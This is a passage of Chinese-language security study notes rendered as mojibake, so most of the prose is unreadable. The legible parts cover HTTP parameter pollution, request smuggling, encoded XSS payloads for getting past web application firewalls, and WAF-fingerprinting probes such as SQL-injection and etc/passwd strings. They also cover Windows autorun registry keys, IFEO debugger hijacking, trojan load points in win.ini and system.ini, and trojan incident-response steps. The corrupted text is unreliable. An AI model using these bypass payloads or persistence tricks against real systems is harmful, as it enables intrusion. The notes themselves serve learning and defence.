¹æ®è¯·æ±‚TCPåŒ…çš„ipæŒ‡å®šçš„ã€‚å‡è®¾ä»clientåˆ°serverä¸­é—´æ²¡æœ‰ä»»ä½•ä»£ç†ï¼Œé‚£ä¹ˆwebæœåŠ¡å™¨ï¼ˆNginxï¼ŒApacheç­‰ï¼‰å°±ä¼šæŠŠclientçš„IPè®¾ä¸ºIPremote_addrï¼›å¦‚æœå­˜åœ¨ä»£ç†è½¬å‘HTTPè¯·æ±‚ï¼ŒwebæœåŠ¡å™¨ä¼šæŠŠæœ€åä¸€æ¬¡ä»£ç†æœåŠ¡å™¨çš„IPè®¾ç½®ä¸ºremote_addrã€‚ ## ä»€ä¹ˆæ˜¯x_forwarded_for ## å½“ä½¿ç”¨ä»£ç†æ—¶ï¼ŒwebæœåŠ¡å™¨æ— æ³•é€šè¿‡TCPæ•°æ®åŒ…æ¥æºè·å¾—å‘èµ·è¯·æ±‚çš„clientçš„çœŸå®IPï¼Œå› æ­¤ä»£ç†æœåŠ¡å™¨é€šå¸¸ä¼šåœ¨httpè¯·æ±‚å¤´å¢åŠ ä¸€ä¸ªå«åšx_forwarded_forçš„å­—æ®µï¼Œç”¨æ¥è®°å½•è¯·æ±‚å‘èµ·è€…çš„çœŸå®IPã€‚åœ¨é€šè¿‡è®°å½•IPæ¥é˜²èŒƒwebæ”»å‡»æ—¶è¦æ³¨æ„ã€‚ 5-2 HTTPå‚æ•°æ±¡æŸ“## å¯¹GET POSTå‚æ•°è‡ªåŠ¨æ‰§è¡ŒHPPæ”»å‡»ã€‚ç›¸åŒçš„å‚æ•°åï¼Œä¸åŒçš„å‚æ•°å€¼ç»•è¿‡ã€‚å‚è€ƒï¼š https://www.cnblogs.com/--QAQ--/p/12846633.html 5-3 HTTPè¯·æ±‚å·è¿(è¯·æ±‚èµ°ç§## è¯·æ±‚å·è¿ä¹Ÿå«åšè¯·æ±‚èµ°ç§ï¼Œå¯¹æ¯ä¸ªè¯·æ±‚è‡ªåŠ¨æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ”»å‡»ï¼Œå…¶ä¸­å°†è™šæ‹Ÿè¯·æ±‚æ·»åŠ åˆ°å¼€å¤´ï¼Œå¹¶åœ¨ç»“å°¾æ·»åŠ çœŸå®ï¼ˆèµ°ç§ï¼‰è¯·æ±‚ã€‚å‚è€ƒï¼š https://blog.csdn.net/sycamorelg/article/details/122229109 ## æˆ‘ä»¬å‰é¢è®²åˆ°çš„åˆ†å—ä¼ è¾“è¿‡wafï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªè¯·æ±‚å·è¿çš„æ‰‹æ®µ 5-4 XSSè¿‡ç‹—https://cloud.tencent.com/developer/article/1595074 bodyonfocusalert(xss) topå¯ä»¥è¿æ¥å¯¹è±¡ä»¥åŠå±æ€§æˆ–å‡½æ•° æ³¨ï¼Œåœ¨gooleæµè§ˆå™¨å®ç”¨ %2bä¸ºurlç¼–ç çš„+%27â€details%20open%20ontoggleeval(%27alert(1)%27) é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°æ¥ç»•è¿‡ ä½¿ç”¨concatæ¥æ‹¼æ¥å­—ç¬¦ä¸²javascript:alert(1) iframe onloadlocationâ€™javascriâ€™.concat(â€˜pt:alerâ€™,â€™t(1)â€™) å…¶ä»–ï¼š Base64ç¼–ç ï¼š details open ontoggleeval(atob(â€˜YWxlcnQoMSkâ€™)) Unicodeç¼–ç  evalæ‹¦æˆªçš„è¯ï¼Œå¯ä»¥è¯•è¯•ï¼ŒæŠŠ e Unicodeç¼–ç  details open ontoggle\\u0065val(atob(â€˜YWxlcnQoMSkâ€™)) urlç¼–ç ï¼š details open ontoggle%65%76%61%6c(atob(â€˜YWxlcnQoMSkâ€™)) urlç¼–ç ï¼š JS8ç¼–ç ï¼š Asciiç ç»•è¿‡ï¼š alert(1) Asciiç¼–ç  bodyonloaddocument.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) svgonloadsetTimeout(String.fromCharCode(97,108,101,114,116,40,49,41)) 5-5 sqlmapè¿‡wafâ€“tamperpythonè„šæœ¬æ–‡ä»¶ 3-12-6 å¦‚ä½•è¯†åˆ«WAF## åœ¨è¯·æ±‚ä¸­è®¾ç½®è‡ªå·±çš„cookieï¼Œä¾‹å¦‚ï¼šCitrixã€Netscalerã€Yunsuo WAFã€safedogã€‚ ## åœ¨headerä¸­å…³è”ï¼Œä¾‹å¦‚ï¼šAnquanbao WAFã€AmazonAWSWAFã€‚ ## ç»å¸¸æ›´æ”¹æ ‡å¤´å’Œæ··ä¹±çš„å­—ç¬¦ä»¥ä½¿æ”»å‡»è€…æ„Ÿåˆ°å›°æƒ‘ï¼Œä¾‹å¦‚ï¼šNetscalerã€Big-IPã€‚ ## åœ¨æœåŠ¡å™¨å¤´æ•°æ®åŒ…ä¸­æš´éœ²è‡ªå·±ï¼Œä¾‹å¦‚ï¼š Approachã€WTS WAFã€‚ ## ä¸€äº›WAFåœ¨å“åº”å†…å®¹bodyä¸­å…¬å¼€è‡ªèº«ã€‚ä¾‹å¦‚ï¼šDotDefenderã€Armorã€Sitelockã€‚ ## å…¶ä»–WAFä¼šå¯¹æ¶æ„è¯·æ±‚åšå‡ºä¸å¯»å¸¸çš„å“åº”ä»£ç ç­”å¤ã€‚ä¾‹å¦‚ï¼šWebKnightã€360WAFã€‚ ## æœ‰äº›WAFä¼šè¿”å›ä¸€å †åƒåœ¾æ•°æ®ã€‚ä¾‹å¦‚ï¼šç™¾åº¦äº‘åŠ é€Ÿä¹ã€‚ æ£€æµ‹æŠ€æœ¯ ## ä»æµè§ˆå™¨å‘å‡ºæ™®é€šçš„GETè¯·æ±‚ï¼Œæ‹¦æˆªå¹¶è®°å½•å“åº”å¤´ï¼ˆç‰¹åˆ«æ˜¯cookieï¼‰ã€‚ ## ä»å‘½ä»¤è¡Œï¼ˆä¾‹å¦‚curlï¼‰å‘å‡ºè¯·æ±‚ï¼Œå¹¶æµ‹è¯•å“åº”å†…å®¹å’Œæ ‡å¤´ï¼ˆä¸åŒ…æ‹¬user-agentï¼‰ã€‚ # å‘éšæœºå¼€æ”¾çš„ç«¯å£å‘å‡ºGETè¯·æ±‚ï¼Œå¹¶æŠ“ä½å¯èƒ½æš´éœ²WAFèº«ä»½çš„æ ‡è¯­ã€‚ # å¦‚æœæŸå¤„æœ‰ç™»å½•é¡µé¢ï¼Œè¡¨å•é¡µé¢ç­‰.è¯·å°è¯•ä¸€äº›å¸¸è§çš„ï¼ˆæ˜“äºæ£€æµ‹çš„ï¼‰æœ‰æ•ˆè´Ÿè½½ï¼Œä¾‹å¦‚ â€œ or 11 â€“ - # å°†......etcpasswdé™„åŠ åˆ°URLæœ«å°¾çš„éšæœºå‚æ•° # åœ¨urlçš„æœ«å°¾æ·»åŠ ä¸€äº›å¸å¼•äººçš„å…³é”®å­—ï¼Œå¦‚â€™or sleepï¼ˆ5ï¼‰â€˜ ## ä½¿ç”¨è¿‡æ—¶çš„åè®®ï¼ˆå¦‚http0.9ï¼‰å‘å‡ºgetè¯·æ±‚ï¼ˆhttp0.9ä¸æ”¯æŒpostç±»å‹æŸ¥è¯¢ï¼‰ã€‚ ## å¾ˆå¤šæ—¶å€™ï¼Œwafæ ¹æ®ä¸åŒçš„äº¤äº’ç±»å‹æ”¹å˜æœåŠ¡å™¨å¤´ã€‚ ## åˆ é™¤æ“ä½œæŠ€æœ¯-å‘é€ä¸€ä¸ªåŸå§‹çš„finrståŒ…åˆ°æœåŠ¡å™¨å¹¶è¯†åˆ«å“åº”ã€‚ ## ä¾§é€šé“æ”»å‡»-æ£€æŸ¥è¯·æ±‚å’Œå“åº”å†…å®¹çš„è®¡æ—¶è¡Œä¸ºã€‚ ä¸»æµWAFæŒ‡çº¹è¯†åˆ«å·¥å…· wafw00f https://github.com/enablesecurity/wafw00f identywaf https://github.com/stamparm/identywaf sqlmapè¯†åˆ«wafã€‚ wafw00f åœ¨kaliä¸­é›†æˆå¥½äº†ï¼Œå¦‚ä¸‹ï¼š wafw00f http://101.132.222.28 identywaf ï¼šè¿™ä¸ªå°±åœ¨å·¥å…·æ–‡ä»¶å¤¹ä¸­ sqlmapæ£€æµ‹wafï¼šä¹‹å‰ç”¨è¿™ä¸ªå‚æ•°ï¼š â€“identify-waf ï¼Œä½†æ˜¯è¿™ä¸ªé€‰é¡¹å·²ç»è¢«åºŸå¼ƒäº†ã€‚ sqlmapæºç ï¼šhttps://github.com/sqlmapproject/sqlmap ä½†æ˜¯æ–°ç‰ˆçš„sqlmapå·²ç»é›†æˆäº†ä¸Šé¢çš„identywaf çš„æºç ï¼Œæ‰€ä»¥sqlmapçš„wafæ¢æµ‹åŠŸèƒ½å…¶å®è¿˜æ˜¯é çš„identywaf ã€‚ 3-13 éšæœºå¯åŠ¨é¡¹åœ¨æ³¨å†Œè¡¨ä¸­çš„ä½ç½®1ï¼‰â€œå¯åŠ¨â€æ–‡ä»¶å¤¹â”€â”€æœ€å¸¸è§çš„è‡ªå¯åŠ¨ç¨‹åºæ–‡ä»¶å¤¹ã€‚ ## å®ƒä½äºç³»ç»Ÿåˆ†åŒºçš„â€œdocuments and Settingsï¼ï¼Userï¼ï¼ã€”å¼€å§‹ã€•èœå•ï¼ï¼ç¨‹åºâ€ç›®å½•ä¸‹ã€‚è¿™æ—¶çš„UseræŒ‡çš„æ˜¯ç™»å½•çš„ç”¨æˆ·åã€‚ 2ï¼‰â€œAll Usersâ€ä¸­çš„è‡ªå¯åŠ¨ç¨‹åºæ–‡ä»¶å¤¹â”€â”€å¦ä¸€ä¸ªå¸¸è§çš„è‡ªå¯åŠ¨ç¨‹åºæ–‡ä»¶å¤¹ã€‚ ## å®ƒä½äºç³»ç»Ÿåˆ†åŒºçš„â€œdocuments and Settingsï¼ï¼All Userï¼ï¼ã€”å¼€å§‹ã€•èœå•ï¼ï¼ç¨‹åºâ€ç›®å½•ä¸‹ã€‚å‰é¢æåˆ°çš„â€œå¯åŠ¨â€æ–‡ä»¶å¤¹è¿è¡Œçš„æ˜¯ç™»å½•ç”¨æˆ·çš„è‡ªå¯åŠ¨ç¨‹åºï¼Œè€Œâ€œAll Usersâ€ä¸­å¯åŠ¨çš„ç¨‹åºæ˜¯åœ¨æ‰€æœ‰ç”¨æˆ·ä¸‹éƒ½æœ‰æ•ˆï¼ˆä¸è®ºä½ ç”¨ä»€ä¹ˆç”¨æˆ·ç™»å½•ï¼‰ã€‚ 3ï¼‰â€œLoadâ€é”®å€¼â”€â”€ ä¸€ä¸ªåŸ‹è—å¾—è¾ƒæ·±çš„æ³¨å†Œè¡¨é”®å€¼ã€‚ ## ä½äºã€”HKEY_CURRENT_USER\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\\loadã€•ä¸»é”®ä¸‹ã€‚ 4ï¼‰â€œUserinitâ€é”®å€¼â”€â”€ç”¨æˆ·ç›¸å…³ ## å®ƒåˆ™ä½äºã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\Userinitã€•ä¸»é”®ä¸‹ï¼Œä¹Ÿæ˜¯ç”¨äºç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½ç¨‹åºçš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå…¶é»˜è®¤å€¼ä¸ºâ€œuserinit.exeâ€ï¼Œç”±äºè¯¥å­é”®çš„å€¼ä¸­å¯ä½¿ç”¨é€—å·åˆ†éš”å¼€å¤šä¸ªç¨‹åºï¼Œå› æ­¤ï¼Œåœ¨é”®å€¼çš„æ•°å€¼ä¸­å¯åŠ å…¥å…¶å®ƒç¨‹åºã€‚ 5ï¼‰â€œExplorer\\Runâ€é”®å€¼â”€â”€ä¸â€œloadâ€å’Œâ€œUserinitâ€ä¸¤ä¸ªé”®å€¼ä¸åŒçš„æ˜¯ï¼Œâ€œExplorer\\Runâ€åŒæ—¶ä½äºã€”HKEY_CURRENT_USERã€•å’Œã€”HKEY_LOCAL_MACHINEã€•ä¸¤ä¸ªæ ¹é”®ä¸­ã€‚å®ƒåœ¨ä¸¤ä¸ªä¸­çš„ä½ç½®åˆ†åˆ«ä¸º ## ï¼ˆHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Runã€•å’Œã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Runã€•ä¸‹ã€‚ 6ï¼‰â€œRunServicesOnceâ€å­é”®â”€â”€å®ƒåœ¨ç”¨æˆ·ç™»å½•å‰åŠå…¶å®ƒæ³¨å†Œè¡¨è‡ªå¯åŠ¨ç¨‹åºåŠ è½½å‰é¢åŠ è½½ã€‚è¿™ä¸ªé”®åŒæ—¶ä½äº ## ã€”HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceã€•å’Œã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceã€•ä¸‹ã€‚ 7ï¼‰â€œRunServicesâ€å­é”®â”€â”€å®ƒä¹Ÿæ˜¯åœ¨ç”¨æˆ·ç™»å½•å‰åŠå…¶å®ƒæ³¨å†Œè¡¨è‡ªå¯åŠ¨ç¨‹åºåŠ è½½å‰é¢åŠ è½½ã€‚è¿™ä¸ªé”®åŒæ—¶ä½äº ## ã€”HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesã€•å’Œã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesã€•ä¸‹ã€‚ 8ï¼‰â€œRunOnce\\Setupâ€å­é”®â”€â”€å…¶é»˜è®¤å€¼æ˜¯åœ¨ç”¨æˆ·ç™»å½•ååŠ è½½çš„ç¨‹åºã€‚è¿™ä¸ªé”®åŒæ—¶ä½äº ## ã€”HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setupã€•å’Œã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setupã€•ä¸‹ã€‚ 9ï¼‰â€œRunOnceâ€å­é”®â”€â”€è®¸å¤šè‡ªå¯åŠ¨ç¨‹åºè¦é€šè¿‡RunOnceå­é”®æ¥å®Œæˆç¬¬ä¸€æ¬¡åŠ è½½ã€‚è¿™ä¸ªé”®åŒæ—¶ä½äº ## ã€”HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceã€•å’Œã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceã€•ä¸‹ã€‚ä½äºã€”HKEY_CURRENT_USERã€•æ ¹é”®ä¸‹çš„RunOnceå­é”®åœ¨ç”¨æˆ·ç™»å½•æ‰£åŠå…¶å®ƒæ³¨å†Œè¡¨çš„Runé”®å€¼åŠ è½½ç¨‹åºå‰åŠ è½½ç›¸å…³ç¨‹åºï¼Œè€Œä½äºã€”HKEY_LOCAL_MACHINEã€•ä¸»é”®ä¸‹çš„Runonceå­é”®åˆ™æ˜¯åœ¨æ“ä½œç³»ç»Ÿå¤„ç†å®Œå…¶å®ƒæ³¨å†Œè¡¨Runå­é”®åŠè‡ªå¯åŠ¨æ–‡ä»¶å¤¹å†…çš„ç¨‹åºåå†åŠ è½½çš„ã€‚åœ¨Windows XPä¸­è¿˜å¤šå‡ºä¸€ä¸ªã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEXã€•å­é”®ï¼Œå…¶é“ç†ç›¸åŒã€‚ 10ï¼‰â€œRunâ€å­é”®â”€â”€ç›®å‰æœ€å¸¸è§çš„è‡ªå¯åŠ¨ç¨‹åºç”¨äºåŠ è½½çš„åœ°æ–¹ã€‚è¿™ä¸ªé”®åŒæ—¶ä½äº## ã€”HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runã€•å’Œã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runã€•ä¸‹ã€‚å…¶ä¸­ä½äºã€”HKEY_CURRENT_USERã€•æ ¹é”®ä¸‹çš„Runé”®å€¼ç´§æ¥ç€ã€”HKEY_LOCAL_MACHINEã€•ä¸»é”®ä¸‹çš„Runé”®å€¼å¯åŠ¨ï¼Œä½†ä¸¤ä¸ªé”®å€¼éƒ½æ˜¯åœ¨â€œå¯åŠ¨â€æ–‡ä»¶å¤¹ä¹‹å‰åŠ è½½ã€‚ 11ï¼‰å†è€…å°±æ˜¯Windowsä¸­åŠ è½½çš„æœåŠ¡äº†ï¼Œå®ƒçš„çº§åˆ«è¾ƒé«˜ï¼Œç”¨äºæœ€å…ˆåŠ è½½ã€‚å…¶ä½äº##ã€”HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Servicesã€•ä¸‹ï¼Œçœ‹åˆ°äº†å—ï¼Œä½ æ‰€æœ‰çš„ç³»ç»ŸæœåŠ¡åŠ è½½ç¨‹åºéƒ½åœ¨è¿™é‡Œäº†ï¼ 12ï¼‰Windows Shellâ”€â”€ç³»ç»Ÿæ¥å£å®ƒä½äº ## ã€”HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\ã€•ä¸‹é¢çš„Shellå­—ç¬¦ä¸²ç±»å‹é”®å€¼ä¸­ï¼ŒåŸºé»˜è®¤å€¼ä¸ºExplorer.exeï¼Œå½“ç„¶å¯èƒ½æœ¨é©¬ç¨‹åºä¼šåœ¨æ­¤åŠ å…¥è‡ªèº«å¹¶ä»¥æœ¨é©¬å‚æ•°çš„å½¢å¼è°ƒç”¨èµ„æºç®¡ç†å™¨ï¼Œä»¥è¾¾åˆ°æ¬ºéª—ç”¨æˆ·çš„ç›®çš„ã€‚ å¦‚(explorer.exe c:\\1.exe) 13ï¼‰BootExecuteâ”€â”€å±äºå¯åŠ¨æ‰§è¡Œçš„ä¸€ä¸ªé¡¹ç›®å¯ä»¥é€šè¿‡å®ƒæ¥å®ç°å¯åŠ¨Natviceç¨‹åºï¼ŒNativeç¨‹åºåœ¨é©±åŠ¨ç¨‹åºå’Œç³»ç»Ÿæ ¸å¿ƒåŠ è½½åå°†è¢«åŠ è½½ï¼Œæ­¤æ—¶ä¼šè¯ç®¡ç†å™¨(smss.exe)è¿›è¡ŒwindowsNTç”¨æˆ·æ¨¡å¼å¹¶å¼€å§‹æŒ‰é¡ºåºå¯åŠ¨nativeç¨‹åº å®ƒä½äºæ³¨å†Œè¡¨ä¸­ ## ã€”HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Session Manager\\ã€•ä¸‹é¢ï¼Œæœ‰ä¸€ä¸ªåä¸ºBootExecuteçš„å¤šå­—ç¬¦ä¸²å€¼é”®ï¼Œå®ƒçš„é»˜è®¤å€¼æ˜¯â€autocheck autochk *â€ï¼Œç”¨äºç³»ç»Ÿå¯åŠ¨æ—¶çš„æŸäº›è‡ªåŠ¨æ£€æŸ¥ã€‚è¿™ä¸ªå¯åŠ¨é¡¹ç›®é‡Œçš„ç¨‹åºæ˜¯åœ¨ç³»ç»Ÿå›¾å½¢ç•Œé¢å®Œæˆå‰å°±è¢«æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å…·æœ‰å¾ˆé«˜çš„ä¼˜å…ˆçº§ã€‚ 14ï¼‰ç­–ç•¥ç»„åŠ è½½ç¨‹åºâ”€â”€æ‰“å¼€Gpedit.mscï¼Œå±•å¼€â€œç”¨æˆ·é…ç½®â€”â€”ç®¡ç†æ¨¡æ¿â€”â€”ç³»ç»Ÿâ€”â€”ç™»å½•â€ï¼Œå°±å¯ä»¥çœ‹åˆ°â€œåœ¨ç”¨æˆ·ç™»å½•æ—¶è¿è¡Œè¿™äº›ç¨‹åºâ€çš„é¡¹ç›®ï¼Œä½ å¯ä»¥åœ¨é‡Œé¢æ·»åŠ ã€‚åœ¨æ³¨å†Œè¡¨ä¸­ ## [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\GroupPolicy Objects\\æœ¬åœ°User\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run] ä½ ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸å¯¹åº”çš„é”®å€¼ã€‚ 15) windowsæ˜ åƒåŠ«æŒæŠ€æœ¯ ## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image FileExecution Options åœ¨æ­¤é¡¹ä¸‹é¢æ–°å»ºâ€“é¡¹(123.exe),å†åˆ°123.exeé¡¹ä¸‹é¢æ–°å»ºâ€“å­—ç¬¦ä¸²(å–åå«:debugger),debuggerå­—ç¬¦ä¸²é‡Œé¢å¡«å†™ä»»æ„æ–‡ä»¶(å¦‚:c:\\windows\\system32\\cmd.exe),æœ€åæ‰“å¼€123.exeå‘ç°å˜æˆæ‰“å¼€cmd.exeäº†ã€‚ 3-14 Windowså…¶å®ƒæœ¨é©¬ã€ç—…æ¯’åŠ è½½é¡¹## ç»ˆç«¯ win.ini 1ã€åœ¨Win.iniä¸­å¯åŠ¨ ## åœ¨Win.iniçš„[windows]å­—æ®µä¸­æœ‰å¯åŠ¨å‘½ä»¤â€œloadâ€å’Œâ€œrunâ€ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹â€œï¼â€åé¢æ˜¯ç©ºç™½çš„ï¼Œå¦‚æœæœ‰åè·Ÿç¨‹åºï¼Œæ¯”æ–¹è¯´æ˜¯è¿™ä¸ªæ ·å­: runc:\\windows\\file.exe loadc:\\windows\\file.exe ## è¦å°å¿ƒäº†ï¼Œè¿™ä¸ªfile.exeå¾ˆå¯èƒ½æ˜¯æœ¨é©¬ã€‚ 2,åœ¨System.iniä¸­å¯åŠ¨ ç»ˆç«¯ system.ini ## System.iniä½äºWindowsçš„å®‰è£…ç›®å½•ä¸‹ï¼Œå…¶[boot]å­—æ®µçš„shellExplorer.exeæ˜¯æœ¨é©¬å–œæ¬¢çš„éšè”½åŠ è½½ä¹‹æ‰€ï¼Œæœ¨é©¬é€šå¸¸çš„åšæ³•æ˜¯å°†è¯¥å¥å˜ä¸ºè¿™æ ·:shellExplorer.exe window.exeï¼Œæ³¨æ„è¿™é‡Œçš„window.exeå°±æ˜¯æœ¨é©¬ç¨‹åºã€‚ ## å¦å¤–ï¼Œåœ¨System.iniä¸­çš„[386Enh]å­—æ®µï¼Œè¦æ³¨æ„æ£€æŸ¥åœ¨æ­¤æ®µå†…çš„â€œdriverè·¯å¾„\\ç¨‹åºåâ€ï¼Œè¿™é‡Œä¹Ÿæœ‰å¯èƒ½è¢«æœ¨é©¬æ‰€åˆ©ç”¨ã€‚å†æœ‰ï¼Œåœ¨System.iniä¸­çš„[mic]ã€[drivers]ã€[drivers32]è¿™ä¸‰ä¸ªå­—æ®µï¼Œè¿™äº›æ®µä¹Ÿæ˜¯èµ·åˆ°åŠ è½½é©±åŠ¨ç¨‹åºçš„ä½œç”¨ï¼Œä½†ä¹Ÿæ˜¯å¢æ·»æœ¨é©¬ç¨‹åºçš„å¥½åœºæ‰€ã€‚ 3ã€åœ¨Autoexec.batå’ŒConfig.sysä¸­åŠ è½½è¿è¡Œï¼Œè¿™ä¸ªå°±ä¸è¦çœ‹äº† ## ä½†è¿™ç§åŠ è½½æ–¹å¼ä¸€èˆ¬éƒ½éœ€è¦æ§åˆ¶ç«¯ç”¨æˆ·ä¸æœåŠ¡ç«¯å»ºç«‹è¿æ¥åï¼Œå°†å·²æ·»åŠ æœ¨é©¬å¯åŠ¨å‘½ä»¤çš„åŒåæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡ç«¯è¦†ç›–è¿™ä¸¤ä¸ªæ–‡ä»¶æ‰è¡Œï¼Œè€Œä¸”é‡‡ç”¨è¿™ç§æ–¹å¼ä¸æ˜¯å¾ˆéšè”½ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•å¹¶ä¸å¤šè§ï¼Œä½†ä¹Ÿä¸èƒ½å› æ­¤è€Œæ‰ä»¥è½»å¿ƒå“¦ã€‚ ## ä»–ä¼šåœ¨é‡Œé¢åŠ å…¥è¿™æ ·çš„å‘½ä»¤:@echo off copy c:\\sys.lon c:\\windows\\StartMenu\\Startup Items\\del c:\\win.reg 4ã€å¯åŠ¨ç»„ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸€ä¼šçœ‹ ## æœ¨é©¬éšè—åœ¨å¯åŠ¨ç»„è™½ç„¶ä¸æ˜¯ååˆ†éšè”½ï¼Œä½†è¿™é‡Œçš„ç¡®æ˜¯è‡ªåŠ¨åŠ è½½è¿è¡Œçš„å¥½åœºæ‰€ï¼Œå› æ­¤è¿˜æ˜¯æœ‰æœ¨é©¬å–œæ¬¢åœ¨è¿™é‡Œé©»ç•™çš„ã€‚å¯åŠ¨ç»„å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸º:C:\\Windows\\Start Menu\\Programs\\StartUpï¼Œåœ¨æ³¨å†Œè¡¨ä¸­çš„ä½ç½®:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders Startupâ€C:\\windows\\start menu\\programs\\startupâ€ã€‚ 3-15 Windowsæœ¨é©¬æŸ¥æ€æ€»ç»“æ³¨å†Œè¡¨è®¾ç½®å¼€å¯è‡ªå¯åŠ¨çš„ä½ç½®æœ‰å¾ˆå¤šã€‚ æŸ¥æ€ç°é¸½å­æœ¨é©¬ç¨‹åºçš„åº”æ€¥å“åº”è¿‡ç¨‹ï¼š 1. è¿›è¡Œå…¬å¸å†…éƒ¨åŠå…¬ç”µè„‘å®‰å…¨æ£€æŸ¥çš„æ—¶å€™ï¼Œå‘ç°æœ‰ä¸€ä¸ªå¼‚å¸¸è¿æ¥ï¼Œå¯¹å¤–è¿æ¥çš„ipåœ°å€(æ”»å‡»è€…çš„)æ˜¯ä¸€ä¸ªå›½å†…æˆ–è€…å›½å¤–çš„ipåœ°å€ã€‚å¦‚æœæ˜¯å›½ å¤–çš„å°±æ²¡æœ‰å°è¯•æº¯æºã€‚ 2. æ’æŸ¥ 1ã€ æŸ¥çœ‹è¿›ç¨‹è¿æ¥å’Œè¿›ç¨‹å¯¹åº”çš„pidï¼Œnetstat -anoã€‚ 2ã€ æŸ¥çœ‹pidå¯¹åº”ç¨‹åºçš„æœåŠ¡åï¼štasklist svcï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœåŠ¡ç›¸å…³ä¿¡æ¯ã€‚ 3ã€ é€šè¿‡xuetr(win7)ï¼Œç«ç»’å‰‘(win10)ï¼ŒæŸ¥çœ‹åˆ°è¯¥è¿›ç¨‹çš„ç­¾åå’Œè¿›ç¨‹æ¨¡å—çš„å‰é¢éƒ½ä¼ªè£…çš„æ˜¯å¾®è½¯çš„å‰é¢ï¼Œä½†æ˜¯æœåŠ¡æ²¡æœ‰ç­¾åï¼Œæ‰€ä»¥æ„Ÿ è§‰æœåŠ¡æœ‰é—®é¢˜ã€‚ 4ã€ åœ¨æ³¨å†Œè¡¨ä¸­åˆ é™¤æœåŠ¡ä¿¡æ¯ã€åˆ é™¤æœåŠ¡ã€ç»“æŸè¿›ç¨‹ã€åˆ é™¤è¿›ç¨‹å¯¹åº”çš„ç¨‹åºæ–‡ä»¶ã€‚ 5ã€æŸ¥çœ‹å¯åŠ¨é¡¹ï¼Œå‘ç°æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ 6ã€æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ å¯åŠ¨é¡¹ã€æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡ã€ä¼ªé€ è¿›ç¨‹ã€ä¸»è¿›ç¨‹æŒ‚è½½dllæ–‡ä»¶ç­‰ã€‚ã€‚ã€‚ æŸ¥æ€pchareæœ¨é©¬ç¨‹åºçš„åº”æ€¥å“åº”è¿‡ç¨‹ï¼š ## å…¬å¸åŒäº‹æˆ–è€…ç”²æ–¹å…¬å¸å‘ç°æœ‰ä¸€å°ç”µè„‘çš„cpuä½¿ç”¨ç‡å¾ˆé«˜ï¼Œä¸çŸ¥é“æ€ä¹ˆåŠï¼Œå«æˆ‘ä»¬è¿‡å»æ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªè¿›ç¨‹å ç”¨çš„cpuä½¿ç”¨ç‡å¾ˆé«˜ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯svchostï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹å¼‚å¸¸çš„è¿›ç¨‹è¿æ¥ï¼Œå‘ç°è¿™ä¸ªsvchostè¿›ç¨‹æœ‰ä¸€ä¸ªå¯¹å¤–è¿æ¥ï¼Œipåœ°å€å‘¢ä¸æ˜¯è¯¥å…¬å¸å†…éƒ¨åŠå…¬éœ€è¦çš„ä¸€ä¸ªè¿æ¥åœ°å€ï¼Œæ‰€ä»¥è§‰å¾—å®ƒæœ‰å¼‚å¸¸ï¼Œå¯èƒ½æ˜¯ä¸­æœ¨é©¬äº†ã€‚è€Œè¿™ä¸ªæœ¨é©¬çš„ä¸€ç›´æ”¶å‘æµé‡æ•°æ®å¯¼è‡´cpuä½¿ç”¨ç‡å¾ˆé«˜ï¼Œç”µè„‘å¾ˆå¡ã€‚ 1. æœ‰å¼‚å¸¸è¿æ¥ 2. æŸ¥çœ‹å¼‚å¸¸è¿æ¥è¿›ç¨‹å¯¹åº”çš„pid 3. 